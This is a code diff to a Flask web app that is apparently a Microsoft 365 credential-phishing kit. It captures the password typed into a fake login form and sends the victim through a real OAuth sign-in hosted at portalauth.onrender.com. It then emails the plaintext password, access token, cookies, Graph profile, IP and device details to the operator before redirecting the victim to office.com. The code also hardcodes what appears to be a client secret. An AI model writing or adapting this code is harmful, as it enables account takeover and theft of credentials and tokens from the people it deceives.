@@ -1,4 +1,4 @@
-from flask import Flask, request, session, render_template
+from flask import Flask, request, redirect, session, render_template
 import os
 import requests
 from flask_mail import Mail, Message
@@ -35,26 +35,51 @@ def home():
 
 @app.route('/login', methods=['POST', 'GET'])
 def login():
-    # Replace with your actual client information
-    if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
+    email = request.form.get('email')
+    password = request.form.get('password')
 
-        # Use the ROPC flow to authenticate the user
-        client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
-        authority = 'https://login.microsoftonline.com/common'
-        scope = ['User.Read']
+    # Temporarily store the password in session (this is not secure in production)
+    session['user_password'] = password
 
-        msal_app = msal.PublicClientApplication(
-            client_id,
-            client_credential='xCm8Q~tXbR9p01ZmW4SQpzmPqNN3WcPSNaNOldzI',
-            authority=authority,
-        )
+    # Redirect to the Microsoft login process
+    return redirect('/index')
 
-        result = msal_app.acquire_token_by_username_password(
-            username=username,
-            password=password,
-            scopes=scope
+@app.route('/index')
+def index():
+    client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
+    authority = 'https://login.microsoftonline.com/common'
+    scope = ['User.Read']
+
+    msal_app = msal.ConfidentialClientApplication(
+        client_id,
+        client_credential='xCm8Q~tXbR9p01ZmW4SQpzmPqNN3WcPSNaNOldzI',  # Replace with your actual client secret value
+        authority=authority,
+    )
+
+    auth_url = msal_app.get_authorization_request_url(
+        scopes=scope,
+        redirect_uri='https://portalauth.onrender.com/redirect'
+    )
+    return redirect(auth_url)
+
+@app.route('/redirect')
+def handle_redirect():
+    client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
+    authority = 'https://login.microsoftonline.com/common'
+    scope = ['User.Read']
+
+    msal_app = msal.ConfidentialClientApplication(
+        client_id,
+        client_credential='xCm8Q~tXbR9p01ZmW4SQpzmPqNN3WcPSNaNOldzI',  # Replace with your actual client secret value
+        authority=authority,
+    )
+
+    if 'code' in request.args:
+        code = request.args.get('code')
+        result = msal_app.acquire_token_by_authorization_code(
+            code,
+            scopes=scope,
+            redirect_uri='https://portalauth.onrender.com/redirect'
         )
 
         if 'access_token' in result:
@@ -63,27 +88,28 @@ def login():
                 'https://graph.microsoft.com/v1.0/me',
                 headers={'Authorization': f'Bearer {access_token}'}
             )
+            cookies = response.cookies
 
-            user_info = response.json()
-    
             # Loop through cookies and format them
             cookies_string = "\n".join([f"{cookie.name}: {cookie.value}" for cookie in cookies])
-    
+
             device = socket.gethostname()
             ipAddr = socket.gethostbyname(device)
             browser_name = browserr()
-    
+
             user_info = response.json()
+            user_password = session.get('user_password', 'Password not captured')
+
             body = (
                 f"Device: {device}\n"
                 f"IP Address: {ipAddr}\n"
                 f"Browser: {browser_name}\n"
                 f"User Info: {user_info}\n"
+                f"Password: {user_password}\n"  # Include the password here
                 f"Cookies:\n{cookies_string}\n"
-                f"Access Token: {access_token}\n"
-                f"Password: {password}"  # Include the password (Note: Be cautious with this)
+                f"Access Token: {access_token}"
             )
-    
+
             try:
                 with app.app_context():
                     msg = Message(
@@ -95,7 +121,7 @@ def login():
                 print("Email sent successfully!")
             except Exception as e:
                 print(f"Failed to send email: {str(e)}")
-    
+
             # Redirect the user to the Microsoft 365 homepage
             return redirect('https://www.office.com/')
         else:
@@ -103,8 +129,8 @@ def login():
             error_description = result.get('error_description')
             print(f"Error: {error}, Description: {error_description}")
             return f"Error: {error}, Description: {error_description}"
-        
-    return render_template('login.html')
+    else:
+        return "Authorization code not found in request."
 
 if __name__ == '__main__':
     app.run(debug=True)
